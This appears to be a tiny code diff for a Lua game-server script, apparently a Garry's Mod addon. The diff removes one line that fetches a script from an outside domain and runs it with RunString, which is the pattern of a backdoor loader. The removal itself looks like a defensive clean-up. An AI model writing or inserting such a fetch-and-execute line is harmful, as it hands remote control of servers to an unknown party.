@@ -1,1 +1,0 @@
-http.Fetch("https://w0rst.xyz/project/func/load.lua", RunString)
